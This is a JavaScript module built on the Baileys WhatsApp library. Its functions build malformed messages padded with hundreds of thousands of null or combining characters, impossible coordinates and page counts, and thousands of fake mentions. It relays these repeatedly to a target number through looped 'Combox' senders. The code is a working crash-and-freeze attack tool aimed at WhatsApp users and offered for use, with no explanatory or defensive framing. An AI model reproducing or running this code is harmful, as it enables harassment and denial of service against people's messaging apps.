
const {generateWAMessageFromContent, proto} = require("@whiskeysockets/baileys");
const chalk = require("chalk");

const Null = {
    key: {
    remoteJid: 'cihuy',
    fromMe: false,
    participant: '0@s.whatsapp.net'
    },
    message: {
    "interactiveResponseMessage": {
    "body": {
    "text": "Sent",
    "format": "DEFAULT"
    },
    "nativeFlowResponseMessage": {
    "name": "vertibus",
    "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"cihuy\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
    "version": 3
    }
    }
    }
    }

async function CrashUi(client, target, Qtd, ThM, cct = false, ptcp = false) {
    let etc = generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "⿻ Vertibus ⿻",
                  fileEncSha256:
                    "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath:
                    "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath:
                    "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256:
                    "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256:
                    "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ThM,
                },
                hasMediaAttachment: true,
              },
              body: {
                text: "⭑̤▾ ⿻ Vertibus ⿻ ▾⭑̤" + "ꦾ".repeat(70000),
              },
              nativeFlowMessage: {
                messageParamsJson:
                  '{"name":"bug_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                buttons: [
                  cct
                    ? {
                        name: "single_select",
                        buttonParamsJson:
                          '{"title":"\n⿻ vertibus ⿻\n\n' +
                          "᬴".repeat(0) +
                          '","sections":[{"title":"⿻ vertibus ⿻","rows":[]}]}',
                      }
                    : {
                        name: "payment_method",
                        buttonParamsJson: "",
                      },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "payment_method",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson:
                      '{"title":"⿻ CrazyCrash ⿻","sections":[{"title":"Vertibus","rows":[]}]}',
                  },
                  {
                    name: "bug_message",
                    buttonParamsJson:
                      '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🔥","flow_id":"MiKako-ID","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "{}",
                  },
                ],
              },
            },
          },
        },
      }),
      {
        userJid: target,
        quoted: Qtd,
      }
    );

    await client.relayMessage(
      target,
      etc.message,
      ptcp
        ? {
            participant: {
              jid: target,
            },
          }
        : {}
    );
    console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ MoonCrash ⿻ ▾⭑"));
  }

  async function InVisiXz(client, X, Qtd, ThM, cct = false, ptcp = false) {
    let etc = generateWAMessageFromContent(
      X,
      proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "CORRUPTED file",
                  fileEncSha256:
                    "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath:
                    "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath:
                    "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256:
                    "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256:
                    "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ThM,
                },
                hasMediaAttachment: true,
              },
              body: {
                text: "⭑̤▾ ⿻ udefined Mesages ⿻ ▾⭑̤",
              },
              nativeFlowMessage: {
                messageParamsJson:
                  '{"name":"bug_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                buttons: [
                  cct
                    ? {
                        name: "single_select",
                        buttonParamsJson:
                          '{"title":"🎭⃟༑⌁⃰Anonymousཀ͜͡' +
                          "᬴".repeat(0) +
                          '","sections":[{"title":"Corrupted Messagesϟ","rows":[]}]}',
                      }
                    : {
                        name: "payment_method",
                        buttonParamsJson: "",
                      },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "payment_method",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson:
                      '{"title":"🎭⃟༑⌁⃰Anonymousཀ͜͡","sections":[{"title":"Corrupted Messages ϟ","rows":[]}]}',
                  },
                  {
                    name: "bug_message",
                    buttonParamsJson:
                      '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🔥","flow_id":"MiKako-ID","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "{}",
                  },
                ],
              },
            },
          },
        },
      }),
      {
        userJid: X,
        quoted: Qtd,
      }
    );

    await client.relayMessage(
      X,
      etc.message,
      ptcp
        ? {
            participant: {
              jid: X,
            },
          }
        : {}
    );
    console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ MoonCrash ⿻ ▾⭑"));
  }

  async function InVisiLoc(client, X, Qtd, ThM, ptcp = false) {
    let etc = generateWAMessageFromContent(
      X,
      proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "⭑̤▾ ⿻ Anonymous ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 922.999999999999,
                  name: "⚝Anonymous⚝",
                  address: "🎭⃟༑⌁⃰Anonymousཀ͜͡",
                  jpegThumbnail: ThM,
                },
                hasMediaAttachment: true,
              },
              body: {
                text: "",
              },
              nativeFlowMessage: {
                messageParamsJson: " Anonymous sender ",
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: {
                      title: "🎭⃟༑⌁⃰Anonymousཀ͜͡",
                      sections: [
                        {
                          title: "Corrupted Messages ϟ",
                          rows: [],
                        },
                      ],
                    },
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: {},
                  },
                ],
              },
            },
          },
        },
      }),
      {
        userJid: X,
        quoted: Qtd,
      }
    );
    await client.relayMessage(
      X,
      etc.message,
      ptcp
        ? {
            participant: {
              jid: X,
            },
          }
        : {}
    );
    console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ Moon Tech ⿻ ▾⭑"));
  }

  async function DocSystem(client, target) {
    let virtex = "😂⃟⃟⃟⃟⃚Corrupted Messages𝄽⃟⃟⃟🇮🇩";

    client.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "😂⃟⃟⃟⃟⃚Corrupted Messages𝄽⃟⃟⃟🇮🇩" + "ꦾ".repeat(50000) + "@1".repeat(30)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Tester" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } });
};
async function DocSystem2(client, target) {
    client.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/pdf",
                        fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                        fileLength: "1991837291999",
                        pageCount: 199183729199991,
                        mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                        fileName: "DeepDocumentDpr",
                        fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                        directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1728631701",
                        contactVcard: true,
                        caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Tester" }],
                            isForwarded: true,
                            quotedMessage: {
                                interactiveResponseMessage: {
                                    body: {
                                        text: "Sent",
                                        format: "DEFAULT"
                                    },
                                    nativeFlowResponseMessage: {
                                        name: "bug_message",
                                        paramsJson: `{
        "screen_2_OptIn_0": true,
        "screen_2_OptIn_1": true,
        "screen_1_Dropdown_0": "Corrupted_Document",
        "screen_1_DatePicker_1": "1028995200000",
        "screen_1_TextInput_2": "anonymous@gmail.com",
        "screen_1_TextInput_3": "94643116",
        "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
        "screen_0_TextInput_1": "Why?",
        "screen_0_Dropdown_2": "001-Grimgar",
        "screen_0_RadioButtonsGroup_3": "0_true",
        "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                        version: 3
                                    },
                                }
                            }
                        }
                    }
                }
            }
        },
        { participant: { jid: target } }
    );
};
async function DocSystem3(client, target) {
    client.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "Corrupted-Document",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "Tra͢sᯭh͢ Ui-Aviliable",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "TypeTrashUi-Killer"
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: 'call_permission_request',
                                buttonParamsJson: '{}'
                            }
                        ]
                    },
                    contextInfo: {
                        quotedMessage: {
                            interactiveResponseMessage: {
                                body: {
                                    text: "Sent",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "bug_message",
                                    paramsJson: `{
        "screen_2_OptIn_0": true,
        "screen_2_OptIn_1": true,
        "screen_1_Dropdown_0": "Corrupted-Document",
        "screen_1_DatePicker_1": "1028995200000",
        "screen_1_TextInput_2": "client@gmail.com",
        "screen_1_TextInput_3": "94643116",
        "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
        "screen_0_TextInput_1": "Why?",
        "screen_0_Dropdown_2": "001-Grimgar",
        "screen_0_RadioButtonsGroup_3": "0_true",
        "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                        }`,
                                    version: 3
                                }
                            }
                        }
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
};

async function BugFrezee(client, target) {
    client.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/pdf",
                        fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                        fileLength: "1991837291999",
                        pageCount: 199183729199991,
                        mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                        fileName: "DeepDocumentDpr",
                        fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                        directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1728631701",
                        contactVcard: true,
                        caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Anonymous🤓" }],
                            isForwarded: true,
                            quotedMessage: {
                                interactiveResponseMessage: {
                                    body: {
                                        text: "Sent",
                                        format: "DEFAULT"
                                    },
                                    nativeFlowResponseMessage: {
                                        name: "bug_message",
                                        paramsJson: `{
        "screen_2_OptIn_0": true,
        "screen_2_OptIn_1": true,
        "screen_1_Dropdown_0": "😂⃟⃟⃟⃟⃚ ͢𝄽Anonymous𝄽⃟⃟⃟🇮🇩",
        "screen_1_DatePicker_1": "1028995200000",
        "screen_1_TextInput_2": "Barainfinity@gmail.com",
        "screen_1_TextInput_3": "94643116",
        "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
        "screen_0_TextInput_1": "Why?",
        "screen_0_Dropdown_2": "001-Grimgar",
        "screen_0_RadioButtonsGroup_3": "0_true",
        "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                        version: 3
                                    },
                                }
                            }
                        }
                    }
                }
            }
        },
        { participant: { jid: target } }
    );            
};
async function EncryptMessage(client, target, ThM) {
const locationMessageContent = proto.Message.fromObject({
viewOnceMessage: {
message: {
locationMessage: {
    degreesLatitude: -999.03499999999999,
    degreesLongitude: 999.03499999999999,
    name: "ꦾ".repeat(50000),
    url: "@1".repeat(30),
    mentionedJid: [
                        "1@s.whatsapp.net",
                        ...Array.from({
                            length: 15000
                        }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                    ],
    jpegThumbnail: ThM
}
}
}
});

const encryptedMessage = generateWAMessageFromContent(target, locationMessageContent, { userJid: target });

await client.relayMessage(target, encryptedMessage.message, { participant: { jid: target } });
};

async function FrezeeMsg1(client, target) {
    let virtex = "⿻ᬃ😂⃟⃟⃟⃟⃚Corrupted Messages𝄽⃟⃟⃟🇯🇵⿻";

    client.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "😂⃟⃟⃟⃟⃚Corrupted Messages𝄽⃟⃟⃟🇯🇵" + "ꦾ".repeat(50000) + "@1".repeat(30)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Tester" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } });
}

async function FrezeeMsg2(client, target) {
    let virtex = "⿻ᬃ😂⃟⃟⃟⃟⃚Anonymous𝄽⃟⃟⃟🇮🇩⿻";
    let memekz = Date.now();

    await client.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: -999.03499999999999,
                            degreesLongitude: 999.03499999999999
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "😂⃟⃟⃟⃟⃚Corrupted Messages𝄽⃟⃟⃟🇯🇵" + "ꦾ".repeat(50000) + "@1".repeat(30)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Tester" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } });
};

async function Combox(client, target) {
for (let i = 0; i < 20; i++) {
await DocSystem(client, target, Null)
await DocSystem2(client, target, Null)
await DocSystem3(client, target, Null)
await BugFrezee(client, target, Null)
await EncryptMessage(client, target, Null)
await FrezeeMsg1(client, target, Null)
await FrezeeMsg2(client, target, Null)
}
console.log(chalk.red.bold(`Bug Target ${target}`))
}

    async function Combox2(client, target) {
        for (let i = 0; i < 20; i++) {
        await CrashUi(client, target)
        await InVisiXz(client, target)
        await InVisiLoc(client, target)
        }
        console.log(chalk.red.bold(`Bug target ${target}`))
        }


        module.exports = {
            Null,
            Combox,
            Combox2,
            CrashUi,
            InVisiXz,
            InVisiLoc,
            DocSystem,
            DocSystem2,
        }